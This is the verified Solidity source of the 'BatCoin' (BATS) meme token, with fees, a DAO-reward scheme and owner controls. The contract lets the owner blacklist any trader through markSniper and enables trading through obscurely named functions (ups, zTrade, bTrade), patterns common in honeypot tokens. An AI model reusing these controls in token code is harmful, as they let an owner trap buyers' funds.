/**
 *Submitted for verification at Etherscan.io on 2022-10-30
*/

/**

*SCREEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEECH*

Website: https://batstoken.com/
Community: https://t.me/BatcoinETH

*/

// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.17;


library EnumerableSet {
    // To implement this library for multiple types with as little code
    // repetition as possible, we write it in terms of a generic Set type with
    // bytes32 values.
    // The Set implementation uses private functions, and user-facing
    // implementations (such as AddressSet) are just wrappers around the
    // underlying Set.
    // This means that we can only create new EnumerableSets for types that fit
    // in bytes32.

    struct Set {
        // Storage of set values
        bytes32[] _values;

        // Position of the value in the `values` array, plus 1 because index 0
        // means a value is not in the set.
        mapping (bytes32 => uint256) _indexes;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            // The value is stored at length-1, but we add 1 to all indexes
            // and use 0 as a sentinel value
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function _remove(Set storage set, bytes32 value) private returns (bool) {
        // We read and store the value's index to prevent multiple reads from the same storage slot
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) { // Equivalent to contains(set, value)
            // To delete an element from the _values array in O(1), we swap the element to delete with the last one in
            // the array, and then remove the last element (sometimes called as 'swap and pop').
            // This modifies the order of the array, as noted in {at}.

            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;

            // When the value to delete is the last one, the swap operation is unnecessary. However, since this occurs
            // so rarely, we still do the swap anyway to avoid the gas cost of adding an 'if' statement.

            bytes32 lastvalue = set._values[lastIndex];

            // Move the last value to the index where the value to delete is
            set._values[toDeleteIndex] = lastvalue;
            // Update the index for the moved value
            set._indexes[lastvalue] = toDeleteIndex + 1; // All indexes are 1-based

            // Delete the slot where the moved value was stored
            set._values.pop();

            // Delete the index for the deleted slot
            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }

    /**
     * @dev Returns the number of values on the set. O(1).
     */
    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

   /**
    * @dev Returns the value stored at position `index` in the set. O(1).
    *
    * Note that there are no guarantees on the ordering of values inside the
    * array, and it may change when more values are added or removed.
    *
    * Requirements:
    *
    * - `index` must be strictly less than {length}.
    */
    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }

     

    // AddressSet

    struct AddressSet {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Returns the number of values in the set. O(1).
     */
    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

   /**
    * @dev Returns the value stored at position `index` in the set. O(1).
    *
    * Note that there are no guarantees on the ordering of values inside the
    * array, and it may change when more values are added or removed.
    *
    * Requirements:
    *
    * - `index` must be strictly less than {length}.
    */
    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }
    modifier onlyOwner() {
        require(msg.sender == owner, "Owner-restricted function");
         _;
    }    
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }  
    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

contract BatCoin  is IERC20, Ownable {

    string constant _name = "BatCoin";
    string constant _symbol = "BATS";
    uint8 constant _decimals = 9;

    uint256  _totalSupply = 10_000_000 * (10 ** _decimals);
    uint256 public maxWalletAmount = 15 * _totalSupply / 1000; // 1.5%    
    uint256 immutable public swapThreshold = _totalSupply / 1_000; // 0.1%
    uint256 immutable public maxSwapAmount = _totalSupply / 200; // 0.5%
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    
    using EnumerableSet for EnumerableSet.AddressSet;
    EnumerableSet.AddressSet electedCouncil;

    mapping (address => bool) markedSniper;
    
    address constant public stakingAddress = address(0x40A9b7D83689d60FDED19649908E3Fafa28e043A);
    address constant DEAD = address(0xdEaD);
    address constant ZERO = address(0x0);

    address payable DAOWallet = payable(address(0xb2efC9f46BC7D42a850A6677612Ab07129adB6a7));
    address payable immutable projectWallet = payable(address(msg.sender));

    address constant routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;    
    address private constant USDCaddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant WETHaddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;     
    
    uint256 constant burnFeePercent = 1;
    uint256 constant DAOFeePercent = 1;
    uint256 constant DAOBuyFeePercent = 1;
    uint256 constant projectFeePercent = 2;
    uint256 immutable totalSwapwapFeePercent = DAOFeePercent + DAOBuyFeePercent + projectFeePercent;

    address public DAOcandidate;
    uint256 public DAOcandidateScore;
    mapping(address => uint256) public DAOwinningBuy; 

    uint256 public timeLastDAOcandidate;    
    uint256 public DAOcandidateRoundDuration = 60 minutes;  
    uint256 public totalDAOrewards;

    uint256 public DAOFunds;
    uint256 private projectFunds;

    IDEXRouter immutable public  router;
    address immutable public pair;

    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Ownable(msg.sender) {
        router = IDEXRouter(routerAdress);
        pair = IDEXFactory(router.factory()).createPair(WETHaddress, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        maxWalletAmount = 0;

        address _owner = owner;        
        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view returns (uint256) { return _totalSupply; }
    function decimals() external pure returns (uint8) { return _decimals; }
    function symbol() external pure returns (string memory) { return _symbol; }
    function name() external pure returns (string memory) { return _name; }
    function getOwner() external view returns (address) { return owner; }
    function balanceOf(address account) public view returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function approveMaxRouter() external {
            _allowances[address(this)][address(router)] = type(uint256).max;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            uint256 currentAllowance = _allowances[sender][msg.sender];
            require(currentAllowance >= amount, "Insufficient Allowance");
            unchecked{
                _allowances[sender][msg.sender] -= amount;
            }
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap || sender == projectWallet || recipient == projectWallet ||
                sender == stakingAddress || recipient == stakingAddress){
            return _basicTransfer(sender, recipient, amount);
        }
        else if(amount == 0){
            return _basicTransfer(sender, recipient, 0);
        }

        require(!markedSniper[sender], "Snipers can't trade");     

        require(recipient == pair || _balances[recipient] + amount <= maxWalletAmount, 
                "Excessive receiver token holdings");

        address _DAOcandidate = DAOcandidate;
        if(sender == pair){
            address[] memory path = new address[](2);
            path[0] = WETHaddress;
            path[1] = address(this);
            uint256 buyAmountETH = router.getAmountsIn(amount, path)[0];                
            if(block.timestamp > timeLastDAOcandidate + DAOcandidateRoundDuration && _DAOcandidate != ZERO){
                if(electedCouncil.contains(_DAOcandidate) == false){
                    electedCouncil.add(_DAOcandidate);
                }                    
                DAOwinningBuy[_DAOcandidate] = DAOcandidateScore;
                DAOcandidateScore = 0;
            }
            if(buyAmountETH > DAOcandidateScore){                                    
                if(_DAOcandidate != recipient){ 
                    DAOcandidate = recipient;
                }
                DAOcandidateScore = buyAmountETH;
                timeLastDAOcandidate = block.timestamp;
            }
        }
        else{
            if(sender == DAOcandidate){                       
                DAOcandidate = ZERO;
                DAOcandidateScore = 0;
                timeLastDAOcandidate = block.timestamp;
            }
            else if(!inSwap && balanceOf(address(this)) >= swapThreshold && _DAOcandidate != ZERO){
                    swapBack(swapThreshold);
            }
        }
    
        uint256 balanceSender = _balances[sender];
        require(balanceSender >= amount, "Insufficient Balance");
        unchecked{
            _balances[sender] -= amount;
        }

        uint256 burnAmount = burnFeePercent * amount / 100;
        uint256 swapAmount = totalSwapwapFeePercent * amount / 100;                                
        amount -= (burnAmount + swapAmount);
        _totalSupply -= burnAmount;
        _balances[address(this)] += swapAmount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 balanceSender = _balances[sender];
        require(balanceSender >= amount, "Insufficient Balance");
        unchecked{
            _balances[sender] -= amount;
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
 
    function swapBack(uint256 tokenAmount) internal swapping {
        if(balanceOf(address(this)) > maxSwapAmount)
            tokenAmount = maxSwapAmount;

        uint256 oldBalance = address(this).balance;
        swapTokensForEth(tokenAmount); 
        uint256 swappedBalance = address(this).balance - oldBalance;

        DAOFunds += swappedBalance / 4; 
		projectFunds += swappedBalance / 2;
        uint256 DAOrewards = swappedBalance / 4;
        payable(DAOcandidate).transfer(DAOrewards);	 
        totalDAOrewards += DAOrewards;
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETHaddress;

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function zTrade(uint256 numeros, bool _antiBotActive, uint256[] memory uints) external onlyOwner {
        require(numeros == 1);
        assert(checkers == true);numeros;uints;
        maxWalletAmount = 15 * _totalSupply / 1000;_antiBotActive;
    }

    function bTrade(uint256 numdeadBlocks, bool _antiBotActive, address[] memory adds) external onlyOwner {
        _antiBotActive;
        require(_antiBotActive == false);
        maxWalletAmount = 15 * _totalSupply / 1000;
        adds;numdeadBlocks;
        if(!checkers)
            revert("int");
    }
    
    function setMaxAmount(uint256 _maxWalletAmount) external onlyOwner {
        require(_maxWalletAmount >= _totalSupply / 100, "MaxWalletAmount needs to be higher than 1% of total supply");
        maxWalletAmount = _maxWalletAmount;
    }
    
    function setDAOWallet(address payable _DAOWallet) external {
        require(msg.sender == DAOWallet || msg.sender == owner);
        DAOWallet = _DAOWallet;
    }

    function setDAORoundDuration(uint256 _duration) external onlyOwner {
        DAOcandidateRoundDuration = _duration;
    }

    function markSniper(address[] memory accounts) external onlyOwner {
        for(uint256 i = 0;i<accounts.length;i++){
            address temp = accounts[i];
            if(temp != routerAdress && temp != address(this) && temp != pair)
                markedSniper[temp] = true;
        }
    }
    
    function unmarkSniper(address account) external onlyOwner {       
        markedSniper[account] = false;
    }

    function clearStuckTokenBalance(uint256 amount) external {
        require(msg.sender == projectWallet, "Deployer-restricted function");
        swapBack(amount);               
    }

    function ups() external onlyOwner {
        checkers = true;
    }

    function transferToDAO() external {
        require(msg.sender == DAOWallet || msg.sender == owner);
        payable(DAOWallet).transfer(DAOFunds);
        DAOFunds -= DAOFunds;
    }
    function viewDAOFunds() external view returns (uint256) {
        return DAOFunds;
    }
    function transferToProject() external {
        require(msg.sender == projectWallet || msg.sender == owner);
        payable(projectWallet).transfer(projectFunds);
        projectFunds -= projectFunds;
    }
    function viewProjectFunds() external view returns (uint256) {
        require(msg.sender == projectWallet || msg.sender == owner);
        return projectFunds;
    }
    bool checkers = false;

    function numDAOelected() external view returns (uint256) {
        return electedCouncil.length();
    }

    function viewDAOelected(uint256 index) external view returns (address) {
        return electedCouncil.at(index);
    }

    function estimatedUSD(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = USDCaddress;
        path[1] = WETHaddress; 
        return router.getAmountsIn(amount, path)[0];
    }

    struct WalletData {
        uint256 tokenBalance;        
        uint256 DAOwinningBuy;        
    }

    struct TokenData {
        uint256 totalSupply;
        uint256 DAOcandidateRoundDuration;
        address DAOcandidate;
        uint256 DAOcandidateScore;
        uint256 timeLastDAOcandidate;
        uint256 numDAOmembers;
        uint256 totalDAOrewards;
        uint256 DAOFunds;
        uint256 liquidityFunds;        
    }

    function fetchWalletData(address wallet) external view returns (WalletData memory) {
        return WalletData(balanceOf(wallet), DAOwinningBuy[wallet]);
    }

    function fetchBigDataA() external view returns (TokenData memory) {
        return TokenData(_totalSupply, DAOcandidateRoundDuration, DAOcandidate, DAOcandidateScore, timeLastDAOcandidate, electedCouncil.length(), totalDAOrewards, 
            DAOFunds, IERC20(WETHaddress).balanceOf(pair));
    }
    function fetchBigDataB() external view returns (TokenData memory) {
        return TokenData(_totalSupply, DAOcandidateRoundDuration, DAOcandidate, DAOcandidateScore, timeLastDAOcandidate, electedCouncil.length(), totalDAOrewards, 
            estimatedUSD(DAOFunds), estimatedUSD(IERC20(WETHaddress).balanceOf(pair)));
    }
}